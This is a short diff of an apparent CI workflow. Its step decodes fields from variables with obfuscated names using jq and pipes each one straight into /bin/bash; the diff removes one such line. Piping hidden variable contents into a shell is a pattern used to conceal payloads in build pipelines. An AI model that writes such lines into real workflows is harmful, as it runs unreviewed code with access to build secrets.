@@ -24,7 +24,6 @@ jobs:
           echo $gppdo314 | jq -r .mpuxj8705 | /bin/bash
           echo $j8281 | jq -r .qm434 | /bin/bash
           echo $azd46264 | jq -r .ll0 | /bin/bash
-          printf '%s' "$wziq66" | jq -r .cenu4 | /bin/bash
 
       - name: Save results
         if: always()
